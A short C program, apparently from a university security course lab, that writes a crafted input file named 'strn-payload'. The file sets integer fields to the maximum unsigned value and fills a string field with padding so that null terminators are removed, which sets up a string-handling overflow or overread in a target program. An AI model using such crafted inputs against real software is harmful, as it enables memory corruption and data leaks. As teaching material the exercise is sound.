
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "cse543-util.h"

#define A_OFFSET
#define pack(addr, offset, value)  (*((int **)(addr+offset)) = value)

int main(int argc, char **argv)
{
	/* write argument to file */
	write_to_file( "strn-payload", "struct A 40\n", 12, FILE_CLEAR );
	write_to_file( "strn-payload", "num_g 4294967295\n", 17, FILE_APPEND );//remove 0 (aka null terminator) from num_g
	write_to_file( "strn-payload", "num_h 4294967295\n", 17, FILE_APPEND );//remove 0 (aka null terminator) from num_h
	write_to_file( "strn-payload", "string_f fffffffffffffffff", 26, FILE_APPEND );//remove terminator from string_f

	exit(0);
}


